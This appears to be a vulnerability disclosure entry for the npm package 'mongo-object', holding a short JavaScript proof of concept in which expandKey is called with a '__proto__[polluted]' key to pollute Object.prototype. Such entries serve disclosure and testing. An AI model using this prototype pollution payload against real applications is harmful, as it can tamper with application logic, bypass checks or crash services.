# mongo-object

- package name: `mongo-object`

- PoC exploit:

```javascript
var mo = require('mongo-object');
assert(({}).polluted === undefined);

mo.expandKey('yes', '__proto__[polluted]', {});
assert(({}).polluted === 'yes');
```